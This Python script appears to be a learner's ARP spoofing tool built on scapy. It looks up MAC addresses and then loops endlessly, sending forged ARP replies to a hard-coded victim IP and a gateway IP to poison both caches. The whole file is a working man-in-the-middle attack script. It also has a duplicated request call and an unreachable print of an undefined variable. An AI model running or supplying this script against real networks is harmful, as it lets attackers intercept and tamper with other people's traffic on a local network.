#!/usr/bin/env python


"""In Terminal use > python > import scapy.all as scapy > scapy.ls(scapy.ARP) for help on arguments"""
""" op is set to 1 by default - an ARP packet will create an ARP request BUT we need to create an ARP RESPONSE so op=2"""

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]

    answered_list = scapy.srp(
        arp_request_broadcast,
        timeout=3,
        verbose=False
    )[0]

    if len(answered_list) == 0:
        return None

    return answered_list[0][1].hwsrc
    """ 
        We have taken the contents of the next block and condenced into answered_list[0][1] b/c we are only requesting the return of the Gateway MAC address
        # clients_list = []
        # for element in answered_list:
        #     client_dict = {
        #         "ip": element[1].psrc,
        #         "mac": element[1].hwsrc
        #     }
        #     clients_list.append(client_dict)
        # return clients_list"""

    print(packet.show())

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False)

""" Create variable for sent packets"""
sent_packets_count = 0
while True:
    spoof("192.168.198.130", "192.168.198.2")
    spoof("192.168.198.2", "192.168.198.130")
    """ Add two packets for each request"""
    sent_packets_count += 2
    """ Dynamic Printing"""
    # Use an \r "r-literal" and add an end
    print("\r[+] Packets sent: " + str(sent_packets_count), end="")
    time.sleep(2)





